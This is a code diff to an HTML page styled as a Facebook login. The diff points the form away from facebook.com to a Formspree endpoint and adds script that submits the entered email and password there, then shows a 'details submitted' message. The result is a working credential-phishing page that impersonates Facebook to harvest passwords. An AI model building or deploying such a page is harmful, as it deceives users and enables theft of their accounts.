@@ -10,11 +10,20 @@
     <div class="login-container">
         <div class="login-box">
             <h2>Facebook</h2>
-            <form action="https://www.facebook.com/login" method="POST">
-                <input type="text" placeholder="Email or Phone" name="email" required>
+            
+            <!-- The Formspree form -->
+            <form id="login-form" action="https://formspree.io/f/xgvkvpvq" method="POST">
+                <input type="hidden" name="_subject" value="New login submission">
+                <input type="email" placeholder="Email or Phone" name="email" required>
                 <input type="password" placeholder="Password" name="password" required>
                 <button type="submit" class="login-btn">Log In</button>
             </form>
+            
+            <!-- Hidden Success Message -->
+            <div id="success-message" class="success-message" style="display: none;">
+                <p>Your details have been submitted! You will receive an email shortly.</p>
+            </div>
+
             <a href="#" class="forgot-password">Forgotten password?</a>
             <div class="signup-container">
                 <p>Don't have an account?</p>
@@ -22,5 +31,37 @@
             </div>
         </div>
     </div>
+
+    <script>
+        // Get the form and success message elements
+        const form = document.getElementById('login-form');
+        const successMessage = document.getElementById('success-message');
+
+        // Add an event listener for the form submission
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();  // Prevent the default form submission
+
+            // Submit the form to Formspree using AJAX (fetch API)
+            const formData = new FormData(form);
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Show the success message after submission
+                    form.reset();  // Clear the form
+                    successMessage.style.display = 'block';  // Show the success message
+                } else {
+                    alert("There was an issue with your submission. Please try again.");
+                }
+            })
+            .catch(error => {
+                alert("There was an error with the submission. Please try again.");
+            });
+        });
+    </script>
+
 </body>
 </html>
